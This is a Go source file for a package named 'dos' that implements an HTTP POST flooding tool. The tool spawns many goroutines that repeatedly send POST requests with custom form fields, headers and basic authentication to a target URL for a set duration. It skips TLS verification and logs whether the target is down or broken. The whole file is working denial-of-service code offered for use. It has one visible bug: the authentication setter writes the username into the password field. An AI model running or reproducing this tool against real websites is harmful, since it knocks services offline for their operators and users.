// Author: PiereLucas

package dos

import (
	"context"
	"crypto/tls"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

// TargetInf - struct for webaddress and formnames
type TargetInf struct {
	threads           int
	duration          int
	webaddress        string
	formnames         url.Values
	headers           map[string]string
	authSet           bool
	authUser          string
	authPass          string
	persistentHeaders http.Header
}

// AddWebaddress - Add or Change value for TargetInf.webaddress
func (inf *TargetInf) AddWebaddress(webAddress string) string {
	inf.webaddress = webAddress
	return inf.webaddress
}

// AddForm - Add formname to TargetInf.formnames
func (inf *TargetInf) AddForm(formName string, formValue string) url.Values {
	if inf.formnames == nil {
		_ = inf.MakeForms()
	}
	inf.formnames.Add(formName, formValue)
	return inf.formnames
}

// AddHeader - Add header to TargetInf.headers
func (inf *TargetInf) AddHeader(key string, value string) map[string]string {
	if inf.headers == nil {
		_ = inf.MakeHeaders()
	}
	inf.headers[key] = value
	return inf.headers
}

// AddAuth - Add basic HTTP authentication user and password
func (inf *TargetInf) AddAuth(user string, password string) {
	inf.authPass = user
	inf.authPass = password
	inf.authSet = true
	return
}

// AppendMore - Append map[string]string key:value pairs to forms or header.
// makes use of internal functions TargetInf.AddForm and TargetInf.AddHeader
// mode = FORMS (for forms)
// mode = HEADERS (for headers)
func (inf *TargetInf) AppendMore(mode string, input map[string]string, wg *sync.WaitGroup) {
	for k, v := range input {
		if mode == "FORMS" {
			inf.AddForm(k, v)
		} else if mode == "HEADERS" {
			inf.AddHeader(k, v)
		} else {
			log.Fatalln("ERROR: in func appendToStruct - wrong mode! [FORMS / HEADERS]")
		}
	}

	wg.Done()
}

// MakeForms - initialize the internal Values struct.
// This function is process using TargetInf.AddForm
func (inf *TargetInf) MakeForms() url.Values {
	inf.formnames = url.Values{}
	return inf.formnames
}

// MakeHeaders - initialize the internal header map.
// This function is process using TargetInf.AddHeader
func (inf *TargetInf) MakeHeaders() map[string]string {
	inf.headers = make(map[string]string)
	return inf.headers
}

// Copy - Copy the TargetInf Struct
func (inf *TargetInf) Copy() TargetInf {
	return *inf // De-reference pointer (return-by-value)
}

// New - Initialize new DoS
// d = duration, t = threads, urladdr = webaddress
func New(d int, t int, urladdr string) *TargetInf {
	return &TargetInf{
		formnames:  url.Values{},
		headers:    make(map[string]string),
		threads:    t,
		duration:   d,
		webaddress: urladdr,
	}
}

// makeRequest - handle our complete request workflow. Build Clients and Requests
func makeRequest(done chan<- struct{}, info *TargetInf) {
	// Set Transport states
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // skip tls verify for more speed
		Proxy:           http.ProxyFromEnvironment,             // use proxies from environment variables
	}

	// Initialize Client
	hc := &http.Client{
		Transport: tr,
	}

	result := make(chan *http.Request)
	go buildRequest(result, info) // Building our request
	req := <-result               // Wait for our request

	r := runtime.NumGoroutine()
	resp, err := hc.Do(req)
	if err != nil {
		//log.Printf("ERROR: do post request: %s\n", err)	// FOR DEBUG
		log.Printf("\tRoutine: %6d |    CONNECTION DOWN (DIAL ERROR) | %s\n", r, info.webaddress)
	}

	// Catch some errors e.g. "socket: too many open files" or "socket: connection reset by peer"
	if resp != nil {
		defer resp.Body.Close() // Close response body at end of function

		if resp.StatusCode >= 200 && resp.StatusCode <= 299 {
			log.Printf("\tRoutine: %6d | HTTP Status is in the 2xx range | %s\n", r, info.webaddress)
		} else {
			log.Printf("\tRoutine: %6d |   Argh! Online but Broken [%3d] | %s\n", r, resp.StatusCode, info.webaddress)
		}

		close(result) // Close request result channel
		close(done)   // sending empty data to done channel
	} else {
		close(result) // Close request result channel
		close(done)   // sending empty data to done channel
	}
}

// runner - function with context that start makeRequest() and return on ctx.Done()
func runner(ctx context.Context, start <-chan struct{}, info *TargetInf) {
	<-start // Starting routine on close of channel starter

	for {
		select {
		case <-ctx.Done(): // Quit routine on receive
			return // Close runner goroutine
		default:
			done := make(chan struct{})
			go makeRequest(done, info)
			select {
			case <-done:
				continue
			case <-time.After(1 * time.Second): // make sure that every second start a new request, still when the last not finish yet
				continue
			}
		}
	}
}

// start - starting N*runner() and building initial request
func start(ctx context.Context, info *TargetInf, done chan<- struct{}) {
	start := make(chan struct{})

	for i := 1; i < info.threads+1; i++ {
		log.Printf("INFO: Starting routine: %d\n", i)
		go runner(ctx, start, info)
	}

	// Build initial request
	func() {
		log.Println("INFO: Building Initial Request")
		result := make(chan *http.Request) // create channel result
		go buildRequest(result, info)      // Building initial request
		_ = <-result
		close(result) // Wait for initial request to be done
	}()

	close(start) // close channel starter to start runner routines
	close(done)  // synchronise and unlock sync in parent function
}

// buildRequest - building request and copy forms and headers in a peristent state
func buildRequest(result chan<- *http.Request, info *TargetInf) {
	// Building initial request and add values to request
	req, err := http.NewRequest("POST", info.webaddress, strings.NewReader(info.formnames.Encode()))
	if err != nil {
		log.Println("ERROR: building request")
	}

	req.PostForm = info.formnames // add url.Values too request

	// add headers and authorization (if set) to request and make it persistent
	if info.persistentHeaders == nil {
		for key, value := range info.headers {
			req.Header.Set(key, value)
		}
		if info.authSet {
			req.SetBasicAuth(info.authUser, info.authPass)
			tempVal := req.Header.Values("Authorization")[0]
			req.Header.Set("Authorization", tempVal)
		}
		info.persistentHeaders = req.Header.Clone()
	} else {
		req.Header = info.persistentHeaders
	}
	result <- req
}

// validateThreads - warns if more threads starting as cpu cores available
func validateThreads(info *TargetInf, done chan<- struct{}) {
	d := runtime.NumCPU() // runtime.NumCPU() returns the number of available CPU Cores
	if d < info.threads {
		log.Printf("WARNING: more routines: %d than cores: %d\n", info.threads, d)
		time.Sleep(3 * time.Second)
	}
	close(done)
}

// Dos - start Dos and returns error or nil
func (inf *TargetInf) Dos(wg *sync.WaitGroup) {
	dostime := time.Duration(inf.duration) * time.Second

	ctx, cancel := context.WithTimeout(context.Background(), dostime) // Intialize context with timeout
	defer cancel()

	// catch SIGINT (CTRL+C) and os.Interrupt
	c := make(chan os.Signal, 1)
	go func() {
		signal.Notify(c, os.Interrupt, syscall.SIGTERM)
		<-c
		log.Printf("\nABORT: you pressed ctrl+c\n")
		cancel()
		/*
			for sig := range c {
				// sig is a ^C, handle it
			}
		*/
	}()

	sync := make(chan struct{})
	go validateThreads(inf, sync)
	<-sync

	sync = make(chan struct{})
	go start(ctx, inf, sync) // start routines
	<-sync                   // wait for start routine

	<-ctx.Done() // wait for context done
	wg.Done()
}
